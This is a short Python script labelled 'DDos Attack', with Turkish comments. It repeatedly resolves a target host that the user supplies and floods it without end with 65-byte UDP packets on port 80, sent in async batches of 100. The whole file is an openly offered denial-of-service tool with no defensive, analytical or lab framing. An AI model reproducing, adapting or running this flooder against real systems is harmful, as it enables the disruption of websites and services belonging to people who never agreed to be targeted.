# DDos Attack
import asyncio
import socket

# Hedef bilgiler
HOST = "Enter Web IP here"
PORT = 80  # HTTP varsayılan portu

# Maksimum eşzamanlı görev sayısı
MAX_CONCURRENT_REQUESTS = 100

# 65 baytlık veri
UDP_PACKET_SIZE = 65
MESSAGE = b"A" * UDP_PACKET_SIZE  # 65 baytlık sabit bir veri

# UDP ile veri gönderme fonksiyonu
async def udp_gonder(ip, port, i):
    try:
        # UDP soketi oluştur
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
            udp_socket.sendto(MESSAGE, (ip, port))  # 65 baytlık veriyi gönder
            print(f"İstek {i}: 65 baytlık veri gönderildi")
    except Exception as e:
        print(f"İstek {i}: Hata oluştu - {e}")

# Eşzamanlı UDP gönderim grubu
async def udp_grubu_gonder(ip, port, baslangic, bitis):
    tasks = [udp_gonder(ip, port, i) for i in range(baslangic, bitis)]
    await asyncio.gather(*tasks)

# Sürekli UDP istek gönderme fonksiyonu
async def surekli_udp_istek():
    try:
        ip = socket.gethostbyname(HOST)  # Hostname'i IP adresine çevir
        i = 0
        while True:
            baslangic = i
            bitis = i + MAX_CONCURRENT_REQUESTS
            await udp_grubu_gonder(ip, PORT, baslangic, bitis)
            i += MAX_CONCURRENT_REQUESTS
    except Exception as e:
        print(f"UDP işlemi sırasında hata oluştu: {e}")

# Programı başlat
asyncio.run(surekli_udp_istek())
